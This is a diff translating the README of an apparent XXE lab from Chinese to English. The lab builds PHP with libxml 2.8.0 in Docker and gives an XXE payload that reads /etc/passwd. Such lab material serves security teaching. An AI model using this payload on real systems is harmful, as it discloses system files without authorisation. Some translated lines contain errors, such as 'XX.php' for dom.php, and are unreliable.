@@ -1,37 +1,37 @@
-# PHP环境 XML外部实体注入漏洞（XXE）
+# PHP Environment XML External Entity Injection Vulnerability (XXE)
 
-环境介绍：
+Environmental introduction:
 
 - PHP 7.0.30
 - libxml 2.8.0
 
-libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。
+After libxml2.9.0, the external entity is not parsed by default, resulting in the demise of the XXE vulnerability. To demonstrate the XXE vulnerability in the PHP environment, this example will compile libxml2.8.0 into PHP. The PHP version does not affect the use of XXE.
 
-使用如下命令编译并启动环境：
+Compile and start the environment with the following command:
 
 ```
-docker-compose up -d
+Docker-compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080/index.php`即可看到phpinfo，搜索libxml即可看到其版本为2.8.0。
+After the environment starts, you can see phpinfo by visiting `http://your-ip:8080/index.php`, and you can see that the version is 2.8.0 by searching libxml.
 
-Web目录为`./www`，其中包含4个文件：
+The web directory is `./www`, which contains 4 files:
 
 ```bash
 $ tree .
 .
-├── dom.php # 示例：使用DOMDocument解析body
+├── dom.php # Example: Parsing a body using DOMDocument
 ├── index.php
-├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body
-└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body
+├── SimpleXMLElement.php # Example: Parsing the body using the SimpleXMLElement class
+└── simplexml_load_string.php # Example: parse the body using the simpleml_load_string function
 ```
 
-`dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php`均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。
+The `XX.php`, `SimpleXMLElement.php`, `simplexml_load_string.php` can trigger the XXE vulnerability. Please read the code of these three files for the specific output points.
 
-Simple XXE Payload：
+Simple XXE Payload:
 
 ```
-<?xml version="1.0" encoding="utf-8"?> 
+<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE xxe [
 <!ELEMENT name ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
@@ -40,8 +40,8 @@ Simple XXE Payload：
 </root>
 ```
 
-输出：
+Output:
 
 ![](1.png)
 
-更多高级利用方法，请自行探索。
+For more advanced use, please explore on your own.
